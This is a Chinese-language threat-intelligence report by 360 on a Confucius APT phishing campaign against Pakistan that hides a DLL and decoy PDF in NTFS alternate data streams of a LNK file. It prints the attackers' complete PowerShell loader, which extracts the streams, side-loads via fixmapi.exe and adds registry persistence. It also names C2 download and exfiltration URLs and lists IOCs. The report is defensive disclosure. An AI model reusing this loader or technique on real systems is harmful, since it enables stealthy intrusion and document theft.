---
title: Confucius组织利用ADS隐藏技术的攻击活动分析
url: https://mp.weixin.qq.com/s?__biz=MzUyMjk4NzExMA==&mid=2247503273&idx=1&sn=284689a960abc3971c0ccfeceb35c312&chksm=f9c1fea0ceb677b6f3dbcf60e3a4cb5045c3473f912d9ccb00e52edd8ab139bc10ceb0075e46&scene=58&subscene=0#rd
source: 360威胁情报中心
date: 2024-10-31
fetch_date: 2025-10-06T18:55:15.551161
---

# Confucius组织利用ADS隐藏技术的攻击活动分析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/6CNEHNicic4PriabaHic7u024OkupNYtzFNYkiaEPBAysrajib0Yzb1v3Kib2ntdomO25Luxic7mQj4Tvm9Mp2SicK6icKKg/0?wx_fmt=jpeg)

# Confucius组织利用ADS隐藏技术的攻击活动分析

高级威胁研究院

360威胁情报中心

**Confucius**

Confucius 组织，又被称“魔罗桫”，该组织自2013年开始活跃，攻击行动主要目的是获取敏感信息。

我们在日常威胁狩猎中观察到该组织的持续活动，主要针对巴基斯坦地区进行攻击，并使用了ADS（Alternate Data Streams）特性来隐藏恶意文件，这种技术在之前该组织的攻击活动中未出现过。鉴于此，我们重点披露该组织使用ADS加载恶意组件的整个流程，以便用户及时发现，避免中招。

# **一、攻击活动分析**

## **1.攻击流程分析**

Confucius组织首先针对目标人群发送钓鱼邮件，并且携带恶意压缩包，其中压缩包中包括一个存在多个数据流的LNK文件，攻击者利用ADS交换数据流实现了恶意DLL和诱饵文档的隐藏，用户解压压缩包，看不到隐藏的DLL等文件，只能看到LNK文件，并且文件大小也只是LNK文件大小本身，但是当用户点击其中LNK文件即中招，LNK文件会释放隐藏的诱饵文档流数据，并释放DLL文件以及拷贝fixmapi.exe实现侧加载，并通过注册表实现持久化驻留。整个流程如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PriabaHic7u024OkupNYtzFNYCHo1mFoKaZXO73MmnQlqjlg9DuftseXiaKnnickLfbIwYGUwlgoVJtsw/640?wx_fmt=png)

## **2.恶意载荷分析**

1.

2.

攻击入口为一个压缩包，文件名称为“Hajj\_Advisory.rar”。

|  |  |
| --- | --- |
| MD5 | fbcac2eb16586813275d2e25ec57142e |
| 文件名称 | Hajj\_Advisory.rar |
| 文件大小 | 131.71 KB (134871 字节) |

解压后可以看到一个同名称的lnk文件，文件大小只有4KB。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PriabaHic7u024OkupNYtzFNYicu3yzibdtpVxWjtYJhVppIJa2WHhUs1ZbDicr2kWd9cmJY3FTTiaRqzsg/640?wx_fmt=png)

但是实际上攻击者利用ADS交换数据流技术在LNK文件中捆绑了两个数据流Banana和Apple，这两个数据流分别是恶意DLL和诱饵文档，不过这两个文件流不显示，即使系统设置显示隐藏文件，解压后也看不到该文件流。通过在CMD中执行dir /r命令，可以看到，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PriabaHic7u024OkupNYtzFNYmAOSBd26a5pqxQf1Sq3FzPoDB8SyKfFNjE5VbAZibh0KsicuwjDL47wg/640?wx_fmt=png)

另外虽然LNK文件大小显示只有4KB，但是仔细观察发现该文件占用空间为188KB,也侧面看出该LNK携带了恶意文件流数据。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PriabaHic7u024OkupNYtzFNYLcbeW66bcwm3HLZ72SNCk322S5Hr9fD3FE011VN2QI3yJDeHeafNVg/640?wx_fmt=png)

解压后的LNK文件基本信息如下：

|  |  |
| --- | --- |
| MD5 | fc81c75276fb21ccebb3ab6a4aac2239 |
| 文件名称 | Hajj\_Advisory.pdf.lnk |
| 文件大小 | 3.04 KB (3113 字节) |

Hajj\_Advisory.pdf.lnk是一个LNK文件，该LNK文件一旦运行会执行以下PowerShell脚本，该脚本的目的是查找“Hajj\_Advisory.pdf.lnk”文件，然后分别读取名为“Apple”和“Banana”的交换数据流。接着将其Apple数据流写入mapistub.dll文件中，将Banana数据流写入file.pdf，并复制“C:\Windows\System32\fixmapi.exe”到mapistub.dll同级目录并命名为“BlueApple.exe”实现侧加载。最后将“BlueApple.exe”添加到“HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows”实现持久化。

|  |
| --- |
| "$abc = Get-ChildItem -Path $env:TMP -Recurse -Name 'Hajj\_Advisory.pdf.lnk' -Depth 1;if ($null -eq $abc) { $abc = Get-ChildItem -Path .\ -Recurse -Name 'Hajj\_Advisory.pdf.lnk' -Depth 1;$ab = Join-Path -Path $(pwd).path -ChildPath $abc} else {$ab = Join-Path -Path $env:TMP -ChildPath $abc};$asx = Get-Content -Path $ab -Stream Apple -Raw; $ctor = 'C:\Program Files\Ava' + 'st So' + 'ftware'; if (-Not (Test-Path -Path $ctor)) { $pa = $env:LocalAppData} else {$pa = 'C:\ProgramData'}; Set-Content -Path (Join-Path -Path $pa -ChildPath '\mapistub.dll') -Value $asx -NoNewline;$asy = Get-Content -Path $ab -Stream Banana -Raw;Set-Content -Path (Join-Path -Path $env:TMP -ChildPath '\file.pdf') -Value $asy -NoNewline;$abz = $env:TMP + '\file.pdf'; start $abz; $c = Join-Path -Path $pa -ChildPath '\BlueApple.exe';Copy-Item -Path C:\Windows\System32\fixmapi.exe -Destination $c;REG ADD 'HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows' /v load /f /d $c;if (-Not (Test-Path -Path $ctor)) {start $c}" |

Hajj\_Advisory.pdf.lnk:Banana实际上是个PDF文件，该文件是巴基斯坦宗教事务和宗教间和谐部关于增加朝圣预算的说明文件。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PriabaHic7u024OkupNYtzFNY7ribXrrIsibNxCXq07qq74hWzXtVnZtYPEpKsXpjW5icFoTvubu0nWRbA/640?wx_fmt=png)

mapistub.dll（Hajj\_Advisory.pdf.lnk:Apple，md5为e0802b79ad53e9b8251034255d759b90）是一个C#编写的第一阶段下载器，该程序一旦被加载，就会分别从https[:]//coldchikenshop29.info/NroWSNCK83.tut或者https[:]//greenearthtreeh.info/UcoBeA.tut处远程下载并内存加载下一阶段载荷。这两个远程下载链接是同一个文件。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PriabaHic7u024OkupNYtzFNY0xMaZr9s96lfFUs997JHIparicyK8F0wVtVnqMCm5Bu8lojiaUull8oQ/640?wx_fmt=png)

下载的文件基本信息如下：

|  |  |
| --- | --- |
| MD5 | 0474c1ff499c5d6a25f4f1893cfbc5a5 |
| 文件名称 | ClassLibrary1.dll |
| 文件大小 | 18.0 KB (18,432 字节) |

ClassLibrary1.dll是mapistub.dll从远端下载并在内存加载而来，该文件是一个C#编写的文件窃取木马。

ClassLibrary1.dll一旦被加载，首先获取C盘的设备ID，机器名(machineName)，用户名(userName)，进行拼接。形成“http[:]//whitemissycorp.info/User\_Hash/[设备ID]\_\_[machineName]\_\_[username].txt”的URL，读取该URL的内容，并按照32位进行分割填充，该内容是用户文件Hash。用于判断后续特定文件是否已经上传。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PriabaHic7u024OkupNYtzFNY6NmFL3tqNH7agSArwc5JG5kGiaQnjml0pxg87AdibWRSVo1nLtOd5VUA/640?wx_fmt=png)

然后计算C:\Users\[username]\路径下OneDrive，Documents，Downloads，Desktop，Pictures，Videos，Music目录下的指定后缀的文件Hash，并和之前远程读取的文件Hash进行比较。判断文件是否上传。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PriabaHic7u024OkupNYtzFNY5HHqqYhcujibByEy20gxc3Tlicz7RvTy0P0yzKhHHUEibuZfS03gkCXFA/640?wx_fmt=png)

该攻击载荷会搜集以下后缀的文件。

|  |
| --- |
| zip,rar,eml,txt,TXT,pdf,PDF,png,PNG,jpg,JPG,DOC,doc,XLS,xlm,XLM,xls,odp,ODP,ods,ODS,odt,ODT,rtf,RTF,ppt,PPT,xlsx,XLSX,xlsm,XLSM,docx,DOCX,pptx,PPTX,docm,DOCM,jpeg,JPEG |

除此以外，该攻击载荷还会收集除C盘以外其他可用磁盘的数据，并且收集除了特定目录以外的文件夹的文件。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PriabaHic7u024OkupNYtzFNYwNrPtV7O5nbN5axp5xibQKicXHBqvxFViaAQqsHEKpG4u8PURES4AnxPg/640?wx_fmt=png)

如果文件Hash并不存在，说明并未上传文件，则将文件通过 “http[:]//whitemissycorp.info/HprodXprnvlm1.php”上传,并将机器名，用户名，文件Hash等信息通过“http[:]//whitemissycorp.info/VueWsxpogcjwq1.php”进行上传，以避免重复上传。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PriabaHic7u024OkupNYtzFNY7Ctd1lkibsW9dsfoRZDNW5CqueRFGyX50TvLibickb0gMQ7BdZ2nN3kWA/640?wx_fmt=png)

# **二、归属研判**

通过对样本整体分析，我们发现本次攻击行动与该组织之前使用LNK文件释放的最终载荷类似。

1.本次攻击使用了ADS交换数据流用来隐藏文件，但是和之前的攻击行动类似，都是使用白加黑组件，并且都使用了fixmapi.exe进行侧加载；

2.本次攻击使用的第一层加载器与之前类似，只是本次攻击存在两个远程链接，之前只有一个下一层载荷链接，这里避免了单一链接出现访问错误的情况。此外本次攻击使用的加载器以及最终下载的载荷都添加了大量无用代码，增加了分析的难度，如下图所示；

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PriabaHic7u024OkupNYtzFNYCKZRTbU0azZZ5JYCA3W3sVEV12hdsfAicy0zzFiaALkEzUiakFROSKOtA/640?wx_fmt=png)

3.本次攻击最终载荷增加了文件收集的范围，之前只是收集C:\Users\[username]\下制定文件夹下的文件，本次攻击除了收集这部分文件以外，还收集了其他盘符下的文件，以及C盘的除特定文件夹以外的文件。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PriabaHic7u024OkupNYtzFNYwNrPtV7O5nbN5axp5xibQKicXHBqvxFViaAQqsHEKpG4u8PURES4AnxPg/640?wx_fmt=png)

整个加载过程、样本载荷并结合攻击目标等信息来看，都与Confucius组织完全吻合。

#

**附录 IOC**

#

**MD5:**

fbcac2eb16586813275d2e25ec57142e

fc81c75276fb21ccebb3ab6a4aac2239

e0802b79ad53e9b8251034255d759b90

0474c1ff499c5d6a25f4f1893cfbc5a5

**C2:**

http[:]//whitemissycorp.info/VueWsxpogcjwq1.php

http[:]//whitemissycorp.info/HprodXprnvlm1.php

https[:]//coldchikenshop29.info/NroWSNCK83.tut

https[:]//greenearthtreeh.info/UcoBeA.tut

**团队介绍**

TEAM INTRODUCTION

**360****高级威胁研究院**

360高级威胁研究院是360政企安全集团的核心能力支持部门，由360资深安全专家组成，专注于高级威胁的发现、防御、处置和研究，曾在全球范围内率先捕获双杀、双星、噩梦公式等多起业界知名的0day在野攻击，独家披露多个国家级APT组织的高级行动，赢得业内外的广泛认可，为360保障国家网络安全提供有力支撑。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pruscv37D0qgOMbfC4jVxUnso6yyhQC9OIyDNX6TYo5k8iafcfZMzT0ia5boCo69WZSicq7krbicKaHsw/0?wx_fmt=png)

360威胁情报中心

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pruscv37D0qgOMbfC4jVxUnso6yyhQC9OIyDNX6TYo5k8iafcfZMzT0ia5boCo69WZSicq7krbicKaHsw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过